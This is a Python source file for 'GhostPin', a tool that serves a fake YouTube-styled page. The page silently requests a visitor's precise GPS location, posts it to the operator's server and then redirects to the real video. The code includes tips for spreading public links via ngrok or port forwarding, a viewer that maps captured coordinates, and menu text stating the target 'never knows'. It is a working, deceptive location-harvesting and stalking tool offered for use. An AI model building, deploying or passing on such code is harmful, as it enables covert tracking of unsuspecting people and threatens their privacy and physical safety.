#!/usr/bin/env python3
"""
GhostPin v6.0 - Production GPS Tracking Framework
Fixed All Issues | Public Link | Auto-Permission
Author: F1REW0LF
License: MIT - Free for Community
Version: 6.0.0
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import signal
import subprocess
from datetime import datetime
from typing import Dict, List, Optional
import argparse

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# ============================[ VERSION & CONFIGURATION ]================================
VERSION = "6.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Free for Community"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                      
{Colors.RED}{Colors.BOLD}    PRODUCTION GPS TRACKING v{VERSION}{Colors.WHITE}
{Colors.YELLOW}{Colors.BOLD}    Fixed | Public Link | Auto-Permission{Colors.WHITE}
{Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
"""
    print(banner)

# ============================[ TRACKING SERVER ]================================

class TrackingServer:
    """
    Production tracking server with all fixes
    """
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.port = 8080
        self.thread = None
        self.running = False
        self.public_ip = None
        self.public_url = None
        
    def start(self, port: int = 8080):
        """Start the tracking server"""
        self.port = port
        self.running = True
        
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
            return False
        
        # Get public IP
        try:
            if REQUESTS_AVAILABLE:
                response = requests.get('https://api.ipify.org?format=json', timeout=5)
                self.public_ip = response.json().get('ip')
        except:
            pass
        
        app = Flask(__name__)
        
        # Serve YouTube-like page with GPS capture
        @app.route('/')
        def index():
            return redirect('https://www.youtube.com')
        
        @app.route('/watch')
        def watch():
            video_id = request.args.get('v', 'dQw4w9WgXcQ')
            
            # Create page that auto-requests permission and redirects
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="5;url=https://www.youtube.com/watch?v={video_id}">
<title>YouTube</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}}
.container{{text-align:center}}
.spinner{{display:inline-block;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #ff0000;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
.loading{{font-size:18px;color:#606060}}
.redirect{{font-size:14px;color:#909090;margin-top:10px}}
.permission-box{{background:#fff;border:1px solid #ddd;border-radius:8px;padding:20px;margin-top:20px;max-width:400px;display:none}}
</style>
<script>
(function() {{
    var redirected = false;
    var token = Math.random().toString(36).substring(2, 10);
    
    function sendLocation(pos) {{
        var data = {{
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString()
        }};
        fetch('/track/' + token, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data)
        }}).catch(function() {{}});
    }}
    
    // Request permission immediately
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(
            function(pos) {{
                sendLocation(pos);
                // Redirect after getting location
                setTimeout(function() {{
                    if (!redirected) {{
                        redirected = true;
                        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
                    }}
                }}, 1000);
            }},
            function(err) {{
                // If user denies, still redirect
                setTimeout(function() {{
                    if (!redirected) {{
                        redirected = true;
                        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
                    }}
                }}, 3000);
            }},
            {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
        );
    }} else {{
        // No geolocation, just redirect
        setTimeout(function() {{
            window.location.href = 'https://www.youtube.com/watch?v={video_id}';
        }}, 2000);
    }}
    
    // Force redirect after 5 seconds
    setTimeout(function() {{
        if (!redirected) {{
            redirected = true;
            window.location.href = 'https://www.youtube.com/watch?v={video_id}';
        }}
    }}, 5000);
}})();
</script>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<div class="loading">Loading YouTube...</div>
<div class="redirect">Please wait...</div>
</div>
</body>
</html>'''
            return html
        
        @app.route('/track/<token>', methods=['POST'])
        def track(token):
            data = request.get_json()
            if data:
                with self.lock:
                    data['token'] = token
                    data['received_at'] = datetime.now().isoformat()
                    self.tracking_data.append(data)
                cprint(f"[+] GPS: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
            return jsonify({'status': 'ok'})
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
            return jsonify({'status': 'cleared'})
        
        @app.route('/status')
        def status():
            return jsonify({
                'running': True,
                'port': self.port,
                'records': len(self.tracking_data)
            })
        
        def run():
            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
        
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        time.sleep(1)
        
        cprint(f"[+] Server running on port {port}", Colors.GREEN)
        
        # Show links
        cprint(f"\n[+] Tracking Links:", Colors.CYAN)
        local_link = f"http://localhost:{port}/watch?v=HainSGzbVCU"
        cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
        
        if self.public_ip:
            public_link = f"http://{self.public_ip}:{port}/watch?v=HainSGzbVCU"
            self.public_url = public_link
            cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
            cprint(f"  (Requires port {port} forwarded in router)", Colors.DIM)
            cprint(f"  (Also check Windows Firewall allows port {port})", Colors.DIM)
        else:
            cprint(f"  Public: Use ngrok - ngrok http {port}", Colors.YELLOW)
        
        cprint(f"\n[+] Auto-redirects to YouTube after capturing GPS", Colors.GREEN)
        
        return True
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

# ============================[ PUBLIC LINK HELPER ]================================

class PublicLinkHelper:
    @staticmethod
    def show_ngrok_help(port: int):
        cprint(f"\n[+] To create public link without port forwarding:", Colors.CYAN)
        cprint(f"  1. Download ngrok from https://ngrok.com/download", Colors.DIM)
        cprint(f"  2. Run: ngrok http {port}", Colors.DIM)
        cprint(f"  3. Copy the https://xxxx.ngrok.io URL", Colors.DIM)
        cprint(f"  4. Use: {Colors.GREEN}https://xxxx.ngrok.io/watch?v=VIDEO_ID{Colors.WHITE}", Colors.WHITE)

# ============================[ MAIN ]================================

class GhostPin:
    def __init__(self):
        self.server = TrackingServer()
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        if self.server:
            self.server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - Production GPS Tracking{Colors.WHITE}
{Colors.CYAN}Fixed | Public Link | Auto-Redirect{Colors.WHITE}
{Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.GREEN}[1] Start Server{Colors.WHITE}
{Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
{Colors.GREEN}[3] View Data{Colors.WHITE}
{Colors.GREEN}[4] Clear Data{Colors.WHITE}
{Colors.GREEN}[5] Show Public Link Help{Colors.WHITE}
{Colors.RED}[6] Exit{Colors.WHITE}
""")
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v6.0 - Production GPS Tracking", Colors.CYAN)
        cprint("[*] Fixed | Public Link | Auto-Redirect", Colors.DIM)
        
        # Auto-start server
        self.server.start(8080)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input("[>] Port (8080): ").strip() or "8080")
                self.server.stop()
                time.sleep(0.5)
                self.server.start(port)
                
            elif choice == '2':
                video_id = input("[>] YouTube Video ID (or random): ").strip()
                if not video_id:
                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                
                local_link = f"http://localhost:{self.server.port}/watch?v={video_id}"
                public_link = f"http://{self.server.public_ip}:{self.server.port}/watch?v={video_id}" if self.server.public_ip else None
                
                cprint(f"\n[+] Tracking Links:", Colors.CYAN)
                cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
                if public_link:
                    cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"  (Requires port {self.server.port} forwarded)", Colors.DIM)
                else:
                    cprint(f"  Public: Use ngrok (option 5)", Colors.YELLOW)
                
                cprint(f"\n[+] How it works:", Colors.CYAN)
                cprint(f"  1. Target opens link", Colors.DIM)
                cprint(f"  2. Browser prompts for location (normal)", Colors.DIM)
                cprint(f"  3. If allowed, GPS captured", Colors.DIM)
                cprint(f"  4. Auto-redirects to YouTube", Colors.DIM)
                cprint(f"  5. Target sees YouTube, never knows", Colors.DIM)
                
                try:
                    import webbrowser
                    webbrowser.open(local_link)
                except:
                    pass
                
            elif choice == '3':
                data = self.server.tracking_data
                if not data:
                    cprint("[!] No data yet", Colors.YELLOW)
                    continue
                
                cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    ts = record.get('received_at', 'N/A')
                    
                    cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                        cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '4':
                self.server.tracking_data.clear()
                cprint("[+] Data cleared", Colors.GREEN)
                
            elif choice == '5':
                PublicLinkHelper.show_ngrok_help(self.server.port)
                
            elif choice == '6':
                cprint("[*] Shutting down...", Colors.GREEN)
                self.server.stop()
                break
            else:
                cprint("[-] Invalid", Colors.RED)

# ============================[ MAIN ]================================

def main():
    parser = argparse.ArgumentParser(description="GhostPin v6.0 - Production GPS Tracking")
    parser.add_argument("--server", action="store_true", help="Start server only")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--video", help="YouTube Video ID")
    
    args = parser.parse_args()
    
    if args.server:
        print_banner()
        server = TrackingServer()
        server.start(args.port)
        PublicLinkHelper.show_ngrok_help(args.port)
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    if args.video:
        print_banner()
        server = TrackingServer()
        server.start(args.port)
        
        link = f"http://localhost:{args.port}/watch?v={args.video}"
        cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
        
        try:
            import webbrowser
            webbrowser.open(link)
        except:
            pass
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    # Interactive
    tool = GhostPin()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        sys.exit(1)
